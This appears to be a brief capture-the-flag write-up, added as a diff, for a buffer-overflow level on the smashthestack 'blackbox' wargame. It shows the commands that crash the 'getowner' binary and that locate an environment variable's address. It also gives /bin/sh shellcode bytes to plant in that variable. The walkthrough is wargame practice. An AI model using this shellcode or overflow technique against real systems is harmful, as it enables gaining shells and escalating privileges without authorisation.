@@ -1,0 +1,23 @@
+Standart buffer overflow.
+ASLR is off.
+
+level2@blackbox:~$ export filename=$(python -c "print 'A'*1000")
+level2@blackbox:~$ ./getowner
+The owner of this file is: 0
+Segmentation fault
+
+Upload "getenvaddr.c"
+> scp -P 2225 getenvaddr.c level2@blackbox.smashthestack.org:/tmp/rot2
+
+Get shellcode address
+level2@blackbox:/tmp/rot2$ ./a.out filename /home/level2/getowner
+filename will be at 0xbfffdb23
+
+Set shellcode ready
+> level2@blackbox:/tmp/rot2$ export filename=$(python -c "print
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'")
+
+
+
+
+
